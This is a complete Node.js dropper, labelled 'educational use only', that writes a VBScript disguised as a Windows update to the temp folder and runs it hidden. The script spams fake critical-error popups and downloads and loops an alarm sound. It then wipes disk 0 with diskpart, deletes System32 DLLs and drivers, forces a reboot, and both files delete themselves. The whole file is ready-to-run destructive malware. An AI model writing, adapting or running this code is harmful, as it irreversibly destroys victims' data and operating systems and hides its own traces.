// dropper.js - Fixed syntax, no errors
// Educational use only - CATShadow

const fs = require('fs');
const path = require('path');
const os = require('os');
const child_process = require('child_process');

function generateVbsPayload() {
    return `' Windows System Update Script
Option Explicit
Dim shell, fso, tempPath, i, alarmUrl, alarmFile, objHTTP, adoStream
Dim diskpartScript, scriptFile, textFile, windir

Set shell = CreateObject("Wscript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
tempPath = shell.ExpandEnvironmentStrings("%TEMP%")

' Wait 10 seconds
WScript.Sleep 10000

' Phase 1: Popup spam
For i = 0 To 49
    shell.Popup "SYSTEM CRITICAL ERROR #" & i & vbCrLf & _
                "MEMORY CORRUPTION DETECTED" & vbCrLf & _
                "PLEASE CONTACT SYSTEM ADMINISTRATOR", _
                0, "WINDOWS SECURITY ALERT", 16
    WScript.Sleep 100
Next

' Phase 2: Download and play alarm sound
alarmUrl = "https://filesamples.com/samples/audio/mp3/sample3.mp3"
alarmFile = tempPath & "\\\\alarm_" & Int(Rnd * 10000) & ".mp3"

Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", alarmUrl, False
objHTTP.Send

If objHTTP.Status = 200 Then
    Set adoStream = CreateObject("ADODB.Stream")
    adoStream.Type = 1
    adoStream.Open
    adoStream.Write objHTTP.responseBody
    adoStream.SaveToFile alarmFile, 2
    adoStream.Close
    
    shell.Run "cmd /c start /min wmplayer """ & alarmFile & """ /loop", 0, False
End If

' Phase 3: System destruction after 5 seconds
WScript.Sleep 5000

' Method A: Corrupt boot via diskpart
diskpartScript = "select disk 0" & vbCrLf & _
                 "clean" & vbCrLf & _
                 "create partition primary" & vbCrLf & _
                 "format fs=ntfs quick" & vbCrLf & _
                 "exit"
scriptFile = tempPath & "\\\\diskpart_cmd.txt"

Set textFile = fso.CreateTextFile(scriptFile, True)
textFile.Write diskpartScript
textFile.Close

shell.Run "diskpart /s """ & scriptFile & """", 0, False

' Method B: Delete critical system files
windir = shell.ExpandEnvironmentStrings("%WINDIR%")
On Error Resume Next
fso.DeleteFile windir & "\\\\System32\\\\*.dll", True
fso.DeleteFile windir & "\\\\System32\\\\drivers\\\\*.sys", True

' Method C: Force immediate reboot
WScript.Sleep 3000
shell.Run "shutdown /r /f /t 0", 0, False

' Self-delete VBScript
On Error Resume Next
fso.DeleteFile WScript.ScriptFullName
`;
}

function main() {
    // Check if Windows
    if (process.platform !== 'win32') {
        console.error('[!] Windows only');
        process.exit(1);
    }

    const tempDir = os.tmpdir();
    const randomName = 'WindowsUpdate_' + Math.floor(Math.random() * 10000) + '.vbs';
    const vbsPath = path.join(tempDir, randomName);
    
    console.log(`[*] Creating: ${vbsPath}`);
    
    try {
        // Write VBS file
        fs.writeFileSync(vbsPath, generateVbsPayload());
        console.log('[+] VBS payload created');
        
        // Execute hidden
        const wscript = child_process.spawn('wscript.exe', [vbsPath], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true
        });
        
        wscript.unref();
        console.log('[+] Payload executed (hidden)');
        
        // Self-delete JS dropper after 1 second
        setTimeout(() => {
            try {
                fs.unlinkSync(__filename);
                console.log('[+] Dropper self-deleted');
            } catch (e) {
                // Silent fail
            }
        }, 1000);
        
    } catch (error) {
        console.error(`[!] Error: ${error.message}`);
        process.exit(1);
    }
}

// Execute
main();
